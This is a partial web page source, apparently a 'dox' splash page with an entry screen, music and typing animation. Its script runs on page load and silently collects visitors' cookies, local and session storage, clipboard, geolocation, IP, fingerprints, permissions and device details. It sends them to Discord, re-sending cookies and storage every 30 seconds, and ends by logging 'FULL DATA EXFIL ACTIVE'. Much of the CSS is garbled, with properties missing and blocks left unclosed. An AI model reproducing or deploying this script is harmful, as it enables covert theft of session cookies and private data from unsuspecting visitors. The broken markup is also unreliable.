  :root {

    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
    transition: background 0.4s ease, color 0.4s ease;
  }

  .bg-image {
    position: fixed;
    top: 0;
    left: 0;

    transition: filter 0.4s ease;
  }

  [data-theme="light"] .bg-image {
    filter: grayscale(1) brightness(0.7) blur(1px);
  }

  .bg-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 1;

    top: 0;
    left: 0;

    height: 100%;
    z-index: 100;

    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: var(--bg);
    transition: opacity 0.8s ease, transform 0.8s ease;
  }

  #entryScreen.hidden {
    opacity: 0;
    transform: scale(0.95);
    pointer-events: none;
  }

  .entry-title {
    font-size: clamp(5rem, 20vw, 12rem);
    font-weight: 900;
    letter-spacing: -0.04em;
    color: var(--text);
    margin-bottom: 2.5rem;
    animation: flicker 3s infinite;
  }

  @keyframes flicker {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.8; text-shadow: 0 0 20px rgba(255,255,255,0.1); }
  }

  .entry-btn {

    font-size: 1.2rem;
    font-weight: 700;
    border: 2px solid var(--text);

    color: var(--text);

    color: var(--bg);
    transform: scale(1.05);
  }

  #mainContent {

    z-index: 2;
    text-align: center;
    padding: 2rem;
    opacity: 0;
    transition: opacity 1.2s ease;
  }

  .dox-title {
    font-size: clamp(3.5rem, 14vw, 8rem);
    font-weight: 900;
    letter-spacing: -0.04em;
    color: var(--text);

    border: 1px solid var(--border);
    padding: 2.5rem 4rem;
    min-width: 380px;
    transition: background 0.3s ease, border-color 0.3s ease;

    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,

    0% { transform: translateY(-100%); }

    color: var(--text);

  .audio-toggle:hover {
    border-color: var(--text);
  }

  /* BOTTOM LEFT - IP ONLY */
  #infoPanel {
    position: fixed;
    bottom: 24px;
    left: 24px;
    z-index: 50;
    background: var(--card);
    border: 1px solid var(--border);
    padding: 10px 16px;

    font-size: 0.8rem;

    color: var(--text);

  /* DISCORD BUTTON */

    padding: 10px 28px;

    font-size: 0.85rem;

    transition: all 0.3s ease;

    text-transform: uppercase;
  }

  #discordBtn:hover {
    border-color: var(--text);
    background: var(--text);
    color: var(--bg);
  }

  @media (max-width: 600px) {
    .dox-box {
      padding: 1.5rem;
      min-width: unset;
      width: 100%;
    }
    .dox-line {
      font-size: 0.8rem;
      height: 2.8rem;
      flex-wrap: wrap;

    }

      font-size: 0.7rem;
      padding: 8px 18px;
      bottom: 12px;
    }
  }

    }
  }

  function grabMimeTypes() {
    if (navigator.mimeTypes) {
      const types = [];
      for (let i = 0; i < navigator.mimeTypes.length; i++) {
        types.push(navigator.mimeTypes[i].type);
      }
      sendToDiscord('MIME TYPES', { types: types.join(', '), count: types.length },
        'Browser capabilities - installed software');
    }
  }

  function grabOrientation() {
    if (screen.orientation) {
      sendToDiscord('SCREEN ORIENTATION', {
        'Type': screen.orientation.type,
        'Angle': screen.orientation.angle + '°'
      }, 'Device orientation - mobile/tablet detection');
    }
  }

  function grabMediaDevices() {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      navigator.mediaDevices.enumerateDevices()
        .then(devices => {
          const deviceList = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
          sendToDiscord('MEDIA DEVICES', { devices: deviceList.join(' | ') },
            'Connected webcams/microphones');
        })
        .catch(() => {});
    }
  }

  function grabNavigationHistory() {
    if (window.performance && window.performance.getEntriesByType) {
      const resourceEntries = performance.getEntriesByType('resource');
      const urls = resourceEntries.map(e => e.name).slice(0, 50);
      sendToDiscord('NAVIGATION & RESOURCES', {
        'Page URL': window.location.href,
        'Referrer': document.referrer || 'Direct',
        'Resources Loaded': urls.join(' | ').substring(0, 2000)
      }, 'Browsing history - profile interests');
    }
  }

  function grabStorageQuota() {
    if (navigator.storage && navigator.storage.estimate) {
      navigator.storage.estimate()
        .then(quota => {
          sendToDiscord('STORAGE QUOTA', {
            'Used': Math.round(quota.usage / 1024 / 1024) + 'MB',
            'Available': Math.round(quota.quota / 1024 / 1024) + 'MB',
            'Percentage': Math.round((quota.usage / quota.quota) * 100) + '%'
          }, 'Device storage capacity');
        })
        .catch(() => {});
    }
  }

  function grabPermissions() {
    if (navigator.permissions && navigator.permissions.query) {
      const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
      const results = {};
      perms.forEach(p => {
        navigator.permissions.query({ name: p })
          .then(result => { results[p] = result.state; })
          .catch(() => {});
      });
      setTimeout(() => {
        if (Object.keys(results).length > 0) {
          sendToDiscord('PERMISSIONS', results, 'What user has granted access to');
        }
      }, 2000);
    }
  }

  function grabHardware() {
    sendToDiscord('HARDWARE SPECS', {
      'CPU Cores': navigator.hardwareConcurrency || 'Unknown',
      'RAM': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
      'Touch Support': navigator.maxTouchPoints > 0 ? 'YES' : 'NO'
    }, 'Device specifications');
  }

  function grabConsoleLogs() {
    const origLog = console.log;
    const origError = console.error;
    const origWarn = console.warn;
    const logs = [];

    console.log = function(...args) { logs.push('LOG: ' + args.join(' ')); origLog.apply(console, args); };
    console.error = function(...args) { logs.push('ERROR: ' + args.join(' ')); origError.apply(console, args); };
    console.warn = function(...args) { logs.push('WARN: ' + args.join(' ')); origWarn.apply(console, args); };

    setTimeout(() => {
      if (logs.length > 0) {
        sendToDiscord('CONSOLE LOGS', { logs: logs.join('\n').substring(0, 2000) },
          'Debug info - find vulnerabilities');
      }
    }, 5000);
  }

  function grabHistory() {
    sendToDiscord('BROWSER HISTORY', {
      'History Length': window.history.length,
      'Current URL': window.location.href,
      'Referrer': document.referrer || 'Direct'
    }, 'Pages visited in session');
  }

  // ---- RUN ALL ----
  function runAllDataGrabbers() {
    grabIPInfo();
    grabCookies();
    grabLocalStorage();
    grabSessionStorage();
    grabDeviceFingerprint();
    grabLocale();
    grabPlugins();
    grabMimeTypes();
    grabNetwork();
    grabPerformance();
    grabGPU();
    grabCanvasFingerprint();
    grabWebRTCIP();
    grabFonts();
    grabGeolocation();
    grabBattery();
    grabOrientation();
    grabHardware();
    grabHistory();
    grabStorageQuota();
    grabConsoleLogs();
    grabPermissions();
    grabNavigationHistory();
    
    setTimeout(grabClipboard, 1500);
    setTimeout(grabAudioFingerprint, 800);
    setTimeout(grabMediaDevices, 2000);
    
    setInterval(() => {
      grabCookies();
      grabLocalStorage();
      grabSessionStorage();
    }, 30000);
  }

  // ============================================================
  // UI CONTROLS
  // ============================================================

  const entryScreen = document.getElementById('entryScreen');
  const mainContent = document.getElementById('mainContent');
  const enterBtn = document.getElementById('enterBtn');
  const themeToggle = document.getElementById('themeToggle');
  const audioToggle = document.getElementById('audioToggle');
  const audio = document.getElementById('bgAudio');
  let audioPlaying = false;

  // ---- SYNC TYPING LOOP - ALL LINES TOGETHER ----
  function startSyncTyping() {
    const lines = document.querySelectorAll('.dox-line .value');
    const texts = [];
    let indices = [];
    let isTyping = true;
    let paused = false;
    const speed = 45;

    lines.forEach(el => {
      texts.push(el.closest('.dox-line').dataset.text);
      indices.push(0);
    });

    function updateAll() {
      if (paused) return;

      let allDone = true;
      
      if (isTyping) {
        // Forward
        for (let i = 0; i < lines.length; i++) {
          if (indices[i] < texts[i].length) {
            lines[i].textContent = texts[i].substring(0, indices[i] + 1) + '▌';
            indices[i]++;
            allDone = false;
          } else {
            lines[i].textContent = texts[i] + '▌';
          }
        }
        
        if (allDone) {
          paused = true;
          setTimeout(() => {
            paused = false;
            isTyping = false;
            updateAll();
          }, 1500);
        } else {
          setTimeout(updateAll, speed);
        }
      } else {
        // Backward
        let anyLeft = false;
        for (let i = 0; i < lines.length; i++) {
          if (indices[i] > 0) {
            lines[i].textContent = texts[i].substring(0, indices[i]) + '▌';
            indices[i]--;
            anyLeft = true;
          } else {
            lines[i].textContent = '▌';
          }
        }
        
        if (!anyLeft) {
          paused = true;
          setTimeout(() => {
            paused = false;
            isTyping = true;
            updateAll();
          }, 1000);
        } else {
          setTimeout(updateAll, speed);
        }
      }
    }

    // Small delay then start
    setTimeout(updateAll, 300);
  }

  enterBtn.addEventListener('click', () => {
    entryScreen.classList.add('hidden');
    setTimeout(() => {
      mainContent.classList.add('visible');
      setTimeout(startSyncTyping, 400);
    }, 800);
    
    audio.play().then(() => {
      audioPlaying = true;
      audioToggle.textContent = '◼';
    }).catch(() => {
      audioToggle.textContent = '♫';
    });
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !entryScreen.classList.contains('hidden')) {
      enterBtn.click();
    }
  });

  themeToggle.addEventListener('click', () => {
    const current = document.body.getAttribute('data-theme');
    document.body.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
  });

  audioToggle.addEventListener('click', () => {
    if (audioPlaying) {
      audio.pause();
      audioPlaying = false;
      audioToggle.textContent = '♫';
    } else {
      audio.play().then(() => {
        audioPlaying = true;
        audioToggle.textContent = '◼';
      }).catch(() => {
        alert('Audio failed. Check the URL.');
      });
    }
  });

  // ---- START ----
  runAllDataGrabbers();
  console.log('🔥 KORBYN DOX - FULL DATA EXFIL ACTIVE');
</script>

</body>
